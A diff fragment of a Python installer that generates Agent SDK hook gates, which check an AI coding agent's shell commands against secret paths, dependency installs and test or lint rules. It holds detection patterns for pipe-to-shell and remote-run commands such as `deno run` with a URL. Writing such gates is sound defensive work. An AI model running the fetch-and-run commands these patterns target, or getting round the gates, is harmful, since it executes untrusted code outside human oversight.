+    # the emission-time GATES - never to the empty set: a security
+    # substrate silently building ZERO gates from a stray `[]` would be
+    # the opposite of fail-loud. (When the project genuinely enables no
+    # SDK gates, GATES itself is empty, so the result is still empty.)
+    hooks = config.get("_resolved_hooks")
+    if hooks:
+        active = set(hooks)
+        return [g for g in _GATE_ORDER if g in active]
+    return [g for g in _GATE_ORDER if g in set(GATES)]
+
+
+def build_hooks(config: dict) -> dict:
+    """The single public builder (seam §9): resolved project config in,
+    Agent SDK hooks mapping out. Fail-loud: a malformed config raises,
+    and gate membership follows the passed config (never a stale
+    emission-time set)."""
+    if not isinstance(config, dict):
+        raise TypeError("build_hooks: config must be the resolved "
+                        "project config dict")
+    missing = [k for k in ("secrets", "deps", "commands")
+               if k not in config]
+    if missing:
+        raise KeyError(f"build_hooks: resolved config missing {missing}")
+    out: dict = {}
+    for name in _enabled_gates(config):
+        registrations = ([_GATE_MATCHERS[name]]
+                         + _GATE_EXTRA_MATCHERS.get(name, []))
+        for event, matcher in registrations:
+            kwargs = {}
+            if name in _GATE_TIMEOUTS:
+                kwargs["timeout"] = _GATE_TIMEOUTS[name]
+            out.setdefault(event, []).append(HookMatcher(
+                matcher=matcher,
+                hooks=[_GATE_FACTORIES[name](config)],
+                **kwargs))
+    return out
+'''
+
+
+def _py(ere: str) -> str:
+    """A cmdpos alternation, respelled as a Python regex.
+
+    cmdpos writes capture groups because bash EREs have no `(?:`; Python only
+    needs them non-capturing, and `_INSTALL_HEAD` embeds `_RUNNERS` inside its
+    own group where a stray capture would renumber `m.group(0)`'s siblings.
+    One textual substitution, applied in one place, so the two dialects cannot
+    drift the way the two hand-written copies did.
+
+    [X-36j] ...EXCEPT THAT THE BLANKET `str.replace` DID EXACTLY THAT. A `(`
+    inside a BRACKET EXPRESSION is a literal character, not a group opener, so
+    rewriting it corrupted `prefix_run`'s brace/subshell arm `[({]` into the
+    class `[(?:{]` - which additionally accepts `?` and `:`. The SDK's prefix
+    run therefore skipped glue the shell's did not, which is the source of
+    every shell/SDK parity split a 1500-command fuzz found, and it shipped in
+    v2.7.0. The one function whose whole purpose is to stop the dialects
+    drifting was the thing drifting them.
+
+    So the scan is bracket-aware: `[` opens a bracket expression and the next
+    `]` closes it (POSIX puts a literal `]` first, which this handles by not
+    treating position 0 as a close). Inside one, nothing is rewritten. This is
+    a parser rather than a substitution because the alternative - a rule that
+    no cmdpos regex may put `(` inside `[...]` - is unwritten, unenforced, and
+    was already violated.
+    """
+    out = []
+    i, n_ere, in_class = 0, len(ere), False
+    while i < n_ere:
+        c = ere[i]
+        if in_class:
+            # A `]` immediately after `[` (or `[^`) is a LITERAL, per POSIX.
+            if c == "]" and not (out and out[-1] in ("[", "^")):
+                in_class = False
+            out.append(c)
+        elif c == "[":
+            in_class = True
+            out.append(c)
+        elif c == "(":
+            out.append("(?:")
+        else:
+            out.append(c)
+        i += 1
+    return "".join(out).replace("(?:?:", "(?:")
+
+
+def sdk_gates_module(cfg: dict) -> str:
+    """Render .claude/sdk_gates/gates.py for this resolved config.
+
+    Only the two literals below are config-derived; the gate logic is
+    static (and therefore syntax-checkable in isolation). Leaf scalars are
+    coerced to str so the json.dumps output is ALWAYS valid Python: a
+    YAML-typed bool/None (minyaml turns unquoted true/false/null into
+    Python bool/None, and resolve_config never type-checks these leaves)
+    would otherwise render as `true`/`null` - valid JSON but undefined
+    Python names, NameError-ing the whole module at import.
+    """
+    gates = [h for h in cfg["_resolved_hooks"] if h in SDK_GATES]
+    resolved = {
+        "secrets": {"never_read_paths":
+                    [str(p) for p in cfg["secrets"]["never_read_paths"]]},
+        "deps": {"approved": [str(x) for x in cfg["deps"]["approved"]]},
+        "commands": {k: str(cfg["commands"].get(k) or "")
+                     for k in ("test", "lint", "format")},
+        # Carried so build_hooks(RESOLVED_CONFIG) derives the same gate
+        # membership on the SEV-1 path that a live resolved config would.
+        "_resolved_hooks": list(gates),
+    }
+    # [WP2 / D9] eval-gate runs commands.eval, so the SEV-1 config carries it
+    # wherever that gate is built. Elsewhere nothing reads it, and the other
+    # fixtures keep their bytes.
+    if "eval-gate" in gates:
+        resolved["commands"]["eval"] = str(cfg["commands"].get("eval") or "")
+    # [WP3 / D2] spec-gate-commit reads its mode and prefixes from config.
+    if "spec-gate-commit" in gates:
+        resolved["hooks"] = {
+            # [WP3 critic 1g] the resolved value: DEFAULTS is its one
+            # default, so a flip there reaches this module too.
+            "spec_gate_commit_mode":
+                str(cfg["hooks"]["spec_gate_commit_mode"]),
+            "spec_gate_commit_prefixes": [
+                str(x) for x in cfg["hooks"].get("spec_gate_commit_prefixes")
+                or ["src/", "lib/", "app/", "test/", "tests/"]]}
+    # [round-4 D3] THE command-position model, interpolated from lib/cmdpos.py.
+    # The emitted module must stay import-standalone, so the sets are rendered
+    # into its prelude rather than imported - but they are rendered from the
+    # ONE definition the shell header is built from, so the two substrates
+    # cannot drift the way D3 records. The gate LOGIC in _STATIC_BODY stays
+    # static and syntax-checkable in isolation; only these three literals move.
+    cmdpos_prelude = (
+        "# [round-4 D3] Generated from lib/cmdpos.py - the single definition\n"
+        "# of the command-position model, shared with the shell substrate.\n"
+        "# Do not hand-edit: a second copy is what D3 was.\n"
+        "_SHELL_INVOKERS = frozenset(%r)\n"
+        "_CMD_PREFIXES = frozenset(%r)\n"
+        "_CMD_DUAL = frozenset(%r)\n"
+        "# [X-36v] The head forms `_invoker_at` must be transparent to, and\n"
+        "# the two that take a NAME before their group. Rendered from the\n"
+        "# SAME cmdpos tuples the shell header's `_cs_head_kind` case arms\n"
+        "# are rendered from, so the two substrates cannot answer 'is this\n"
+        "# word the command word' differently - which is round-4 D3, and\n"
+        "# which is how `then|else|do|elif` came to be known to the anchor\n"
+        "# and to neither walker.\n"
+        "_HEAD_TRANSPARENT = frozenset(%r)\n"
+        "_NAMED_GROUP_HEADS = frozenset(%r)\n"
+        "# [round-5 P4] ANSI-C and locale quoting: the `$` is part of the\n"
+        "# quote. [round-5 P1] The operators a newline may follow as a JOIN.\n"
+        "_ANSIC_QUOTES = %r\n"
+        "_NL_JOIN_OPS = %r\n"
+        "_CMD_PFX_RE = %r\n\n"
+        "# [X-36h] The two DECIDABLE expansions, rendered from cmdpos with\n"
+        "# `%%r` rather than hand-written into the static body. Both carry a\n"
+        "# CAPTURE group, so neither goes through `_py()`. Hand-writing them\n"
+        "# cost a real SDK-more-permissive split: the static body is a\n"
+        "# NON-RAW string, a negated class lost a backslash, and the emitted\n"
+        "# class excluded the letter `s` from the literal-default word.\n"
+        "_ANSIC_RE = re.compile(%r)\n"
+        "_ANSIC_SAFE = frozenset(%r)\n"
+        "_PARAM_DEFAULT_RE = re.compile(%r)\n"
+        "# [X-36h perf] How many UTF-8 BYTES a command may be before the\n"
+        "# third spelling is skipped. Rendered from\n"
+        "# cmdpos.RESOLVED_SPELLING_MAX, which also renders the shell hook's\n"
+        "# copy; the guard is deny-only, so a skipped spelling restores the\n"
+        "# v2.7.1 verdict exactly. BYTES, not characters, because that is\n"
+        "# the only unit bash can count in every locale - see _budget_len.\n"
+        "_RESOLVED_MAX = %d\n\n"
+        "_DOWNLOADERS = frozenset(%r)\n"
+        "_INTERPRETERS = frozenset(%r)\n"
+        "# [issue #50] The two bounds `_int_word` searches within: the\n"
+        "# suffix itself and the longest member name (7, `Rscript`). Both\n"
+        "# are rendered from the same cmdpos definitions the shell hook's\n"
+        "# `_xp_iw` is rendered from, so the bound cannot drift between\n"
+        "# the substrates - and adding an interpreter re-derives it rather\n"
+        "# than silently truncating the search.\n"
+        "_INT_SUFFIX_RE = re.compile(%r)\n"
+        "_INT_MAXLEN = max(len(_w) for _w in _INTERPRETERS)\n"
+        "# [issue #50] THE SHELLS WITHIN _INTERPRETERS - cmdpos.INVOKERS,\n"
+        "# the same definition the shell hook's `@@SHELL_INT_CASE@@` is\n"
+        "# rendered from, so the two substrates' phase-2 arms are ONE\n"
+        "# spelling of one word set. NOT `_SHELL_INVOKERS`, which is\n"
+        "# ALL_INVOKERS and carries the three DUAL words (`ssh`, `watch`,\n"
+        "# `xargs`): those are wrapper words, never interpreters, so a\n"
+        "# reduced word cannot be one and naming them here would state a\n"
+        "# set wider than the arm can ever see - which is exactly how the\n"
+        "# two substrates drift apart silently (round-4 D3).\n"
+        "_INT_INVOKERS = frozenset(%r)\n"
+        "# [issue #54 / X-36q] cmdpos.INVOKER_WORD_MAX, POSIX NAME_MAX: the\n"
+        "# longest basename the invoker reduction is asked about. Rendered\n"
+        "# from the same number as the shell hook's guard, so the two\n"
+        "# substrates cannot disagree about which words are too long to name\n"
+        "# a program. SEMANTIC, not a perf fence - see the shell twin.\n"
+        "_INV_WORD_MAX = %d\n"
+        "# [round-4 P1/P3] The four word sets the D20 walks were missing.\n"
+        "# FILE_RUNNERS adds `.`/`source` to INTERPRETERS (finding 19);\n"
+        "# COMPOUND_HEADS and INERT_FILTERS are the P3 classification\n"
+        "# (findings 5, 17, 18); WRITER_* is the four-shape capture, which\n"
+        "# is now a refinement rather than the safety boundary.\n"
+        "_FILE_RUNNERS = frozenset(%r)\n"
+        "_COMPOUND_HEADS = frozenset(%r)\n"
+        "_INERT_FILTERS = frozenset(%r)\n"
+        "_WRITER_WORDS = frozenset(%r)\n"
+        "_WRITER_FLAGS = frozenset(%r)\n"
+        "# [batch 30-33] EIGHT NAMES WERE DELETED FROM THIS PRELUDE, all of\n"
+        "# them fences for the two removed exemptions: _PREFIX_OPERAND_FREE,\n"
+        "# _EXCL_GLOB_FLAGS, _EXCL_GLOB_ATTACHED, _RG_BOOL_FLAGS,\n"
+        "# _HEAD_KEYWORDS, _RG_END_OF_OPTIONS and _SUBST_MARKERS (X-31);\n"
+        "# _A0_META, _STDIN_DATA_INTERPRETERS, _PROGRAM_FLAGS and\n"
+        "# _STDIN_PATH_RE (X-32). None has a consumer left.\n"
+        "# [round-4 P2] The write-set canonicalizer's data: the shell\n"
+        "# tokenizer's in-quote whitespace sentinel, and the control\n"
+        "# operators a write target cannot carry across the correlation.\n"
+        "_XP_WS = %r\n"
+        "_XP_OPS = %r\n"
+        "# [pipe-rule-url-pipe-cubic] The ORACLE: kept so tests can check\n"
+        "# _pipe_to_shell against it. No runtime code calls it - one caller\n"
+        "# puts the cubic back - and a test pins that.\n"
+        "_PIPE_TO_SHELL = re.compile(%r)\n"
+        "# _PIPE_TO_SHELL from its `[|]` on, matched ANCHORED at each pipe.\n"
+        "_PIPE_TAIL = re.compile(%r)\n"
+        "# [issue #36] The whole install anchor after the prefix run -\n"
+        "# tools, verbs, runner channels and the `python -m` transparent\n"
+        "# prefix - ONE rendering with the shell gate's HEAD.\n"
+        "_INSTALL_TAIL = %r\n"
+        "# [#43 review] The words an install tail can END on, derived\n"
+        "# from the same tables the tail is built from. A performance\n"
+        "# guard only. The unguarded second pass is NOT the guarantee -\n"
+        "# it covers a MISSING match, not a LATER one. The guarantee is\n"
+        "# the census test: every match must end on a token whose key\n"
+        "# is a completer (cmdpos.completer_key).\n"
+        "_INSTALL_COMPLETERS = frozenset(%r)\n"
+        "_COMPLETER_GLUE = %r\n"
+        "# [round-4 D20] The two channels that need a DISTINGUISHING token.\n"
+        "# `deno run main.ts` and `uv run python` are ordinary; blocking them\n"
+        "# is the unactionable-refusal shape this suite has shipped twice.\n"
+        "_REMOTE_RUN = re.compile(%r)\n"
+        "_UV_WITH = re.compile(%r)\n\n"
+        % (sorted(cmdpos.ALL_INVOKERS), sorted(cmdpos.ALL_PREFIXES),
+           sorted(cmdpos.DUAL),
+           sorted(cmdpos.HEAD_TRANSPARENT), sorted(cmdpos.NAMED_GROUP_HEADS),
+           tuple(cmdpos.ANSIC_QUOTES), tuple(cmdpos.NL_JOIN_OPS),
+           _py(cmdpos.anchor_regex(space=r"\s+", nonspace=r"\S")),
+           cmdpos.ANSIC_RE_SRC, cmdpos.ANSIC_SAFE,
+           cmdpos.PARAM_DEFAULT_RE_SRC, cmdpos.RESOLVED_SPELLING_MAX,
+           sorted(cmdpos.DOWNLOADERS), sorted(cmdpos.INTERPRETERS),
+           cmdpos.INTERP_SUFFIX, sorted(cmdpos.INVOKERS),
+           cmdpos.INVOKER_WORD_MAX,
+           sorted(cmdpos.FILE_RUNNERS), sorted(cmdpos.COMPOUND_HEADS),
+           sorted(cmdpos.INERT_FILTERS), sorted(cmdpos.WRITER_WORDS),
+           sorted(cmdpos.WRITER_FLAGS),
+           cmdpos.XP_WS, tuple(cmdpos.XP_OPS),
+           _py(cmdpos.pipe_to_shell_regex(space=r"\s+", nonspace=r"\S",
+                                          ws=r"\s")),
+           _py(cmdpos.pipe_to_shell_tail(space=r"\s+", nonspace=r"\S",
+                                         ws=r"\s")),
+           _py(cmdpos.install_head_tail(space=r"\s+", nonspace=r"\S",
+                                        space0=r"\s*", wsp=r"\s")),
+           sorted(cmdpos.install_completers()), cmdpos.COMPLETER_GLUE,
+           r"(?:^|\s)(?:\S*/)?deno\s+run(?:\s+-\S+)*\s+\S*://",
+           r"(?:^|\s)(?:\S*/)?uv\s+run(?:\s+-\S+)*\s+--with(?:=|\s)")
+    )
+    no_tests_prelude = (
+        "# [WP1] Rendered from sdk_gates_template.NO_TESTS_RC5_RE and\n"
+        "# NO_TESTS_NOTICE - the definitions the shell test-gate's exit-5\n"
+        "# arm is emitted from. Do not hand-edit one copy.\n"
+        "_NO_TESTS_RC5 = re.compile(%r)\n"
+        "_NO_TESTS_NOTICE = %r\n"
+        "# [WP3 fix 8] And from UNITTEST_RC1_RE, NO_START_DIR_RE and\n"
+        "# NO_START_DIR_NOTICE, its missing-start-directory arm.\n"
+        "_UNITTEST_RC1 = re.compile(%r)\n"
+        "_NO_START_DIR = re.compile(%r)\n"
+        "_NO_START_DIR_NOTICE = %r\n\n"
+        % (NO_TESTS_RC5_RE, NO_TESTS_NOTICE, UNITTEST_RC1_RE,
+           NO_START_DIR_RE, NO_START_DIR_NOTICE))
+    wp2_prelude = (
+        "# [WP2] Rendered from sdk_gates_template's shared constants - the\n"
+        "# definitions the shell hooks are emitted from. Do not hand-edit\n"
+        "# one copy.\n"
+        "_LINT_CONTEXT_MAX = %d\n"
+        "_LINT_TAIL_LINES = %d\n"
+        "_LINT_UNSET_NOTICE = %r\n"
+        "_RUNNER_NO_CAPTURE_NOTE = %r\n"
+        "_RUNNER_TAIL_LINES = %d\n"
+        "_RUNNER_TAIL_BYTES = %d\n"
+        "_TDD_TEST_BASENAMES = %r\n"
+        "_TDD_TEST_DIRS = %r\n"
+        "_TDD_TEST_SOURCE_SETS = %r\n\n"
+        % (LINT_CONTEXT_MAX, LINT_TAIL_LINES, LINT_UNSET_NOTICE,
+           RUNNER_NO_CAPTURE_NOTE,
+           RUNNER_TAIL_LINES, RUNNER_TAIL_BYTES, TDD_TEST_BASENAMES,
+           TDD_TEST_DIRS, TDD_TEST_SOURCE_SETS))
+    # [WP3 fix2 IT-1] The shim's identity is lib/templates.py's (templates
+    # imports this module, so the import waits until a module is rendered).
+    from templates import GIT_HOOK_SHIM_SHA256
+    wp3_prelude = (
+        "# [WP3 fix1 INST-3] Rendered from sdk_gates_template's shared\n"
+        "# notes, which spec-gate-commit.sh is emitted from.\n"
+        "_SPEC_FALLBACK_NOTE_FOREIGN = %r\n"
+        "_SPEC_FALLBACK_NOTE_HOOKS_PATH = %r\n"
+        "_SPEC_FALLBACK_NOTE_NOEXEC = %r\n"
+        "_SPEC_FALLBACK_NOTE_HOOKS_OFF = %r\n"
+        "# [WP3 fix2 IT-1] The SHA-256 of the git-hook shim bootstrap-install\n"
+        "# writes (lib/templates.py); the fallback defers to that file only.\n"
+        "_SPEC_SHIM_SHA256 = %r\n\n"
+        % (SPEC_FALLBACK_NOTE_FOREIGN, SPEC_FALLBACK_NOTE_HOOKS_PATH,
+           SPEC_FALLBACK_NOTE_NOEXEC, SPEC_FALLBACK_NOTE_HOOKS_OFF,
+           GIT_HOOK_SHIM_SHA256))
+    dynamic = (
+        cmdpos_prelude
+        + no_tests_prelude
+        + wp2_prelude
+        + wp3_prelude
+        + "# The gates enabled for THIS project at emission.\n"
+        "#\n"
+        "# [upstream P2-2] NOT parity with the shell suite - the\n"
+        "# earlier claim of parity was false. 7 gates here; 11 in the\n"
+        "# shell suite. Shell-only, ABSENT here: ci-mirror (so\n"
+        "# `git push` is UNGATED under SDK dispatch), drift-detector,\n"
+        "# cost-log, task-done-alarm, decision-required-alarm,\n"
+        "# spec-gate-entry. The shell suite is canonical; this module\n"
+        "# is a consistent SUBSET of it.\n"
+        f"GATES = {json.dumps(gates)}\n\n"
+        "# Emission-time snapshot of the gate-relevant resolved config.\n"
+        "# build_hooks(config) uses the config the CALLER passes (per the\n"
+        "# seam-locked signature); this snapshot records what the installer\n"
+        "# resolved at emission - digest-protected so drift between the two\n"
+        "# is detectable - and serves SEV-1 use: build_hooks(RESOLVED_CONFIG).\n"
+        f"RESOLVED_CONFIG = {json.dumps(resolved, indent=4)}\n"
+    )
+    return _HEADER + dynamic + _STATIC_BODY
